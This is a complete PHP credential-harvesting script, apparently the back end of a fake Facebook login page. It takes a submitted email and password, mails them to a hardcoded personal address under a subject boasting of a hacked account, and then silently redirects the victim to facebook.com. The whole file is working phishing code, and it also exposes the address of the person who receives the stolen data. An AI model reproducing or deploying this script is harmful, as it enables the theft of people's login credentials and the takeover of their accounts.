<?php 

error_reporting(E_ALL ^ E_DEPRECATED);
header('Content-Type: text/html; Charset=UTF-8');

date_default_timezone_set('America/Mexico_City');


if(isset($_POST['txtCorreo'])) {

    // EDIT THE 2 LINES BELOW AS REQUIRED
    $email_to = "oliver.velazquez@corsec.com.mx";
    $email_subject = "Tienes un cuenta Hack!";

    function died($error) {
        // your error code can go here
        echo "Lo sentimos mucho, pero se encontraron errores con el formulario que envió. ";
        echo "Estos errores aparecen debajo.<br /><br />";
        echo $error."<br /><br />";
        echo "Por favor, vuelve y corrige estos errores.<br /><br />";
        die();
    }

    // validation expected data exists
    if(!isset($_POST['txtCorreo']) ||        
        !isset($_POST['txtPass'])) {
        died('Lo sentimos, pero parece que hay un problema con el formulario que envió.');       
    }
    $email_from = $_POST['txtCorreo']; // required    
    $message = $_POST['txtPass']; // required

    $error_message = "";
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
  if(!preg_match($email_exp,$email_from)) {
    $error_message .= 'La dirección de correo electrónico que ingresaste no parece ser válida.<br />';
  }

 
  if(strlen($message) < 2) {
    $error_message .= 'El mensaje que ingresaste no parece ser válido.<br />';
  }

  if(strlen($error_message) > 0) {
    died($error_message);
  }
    $email_message = "Info. Hackeada:\n\n";

    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }


    $email_message .= "Correo: ".clean_string($email_from)."\n";   
    $email_message .= "Password: ".clean_string($message)."\n";

// create email headers
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers);

echo "<meta http-equiv='refresh' content='0;url=https://www.facebook.com/'>";

}else{
	echo "<script> window.location='https://www.facebook.com/';</script>";
}

 ?>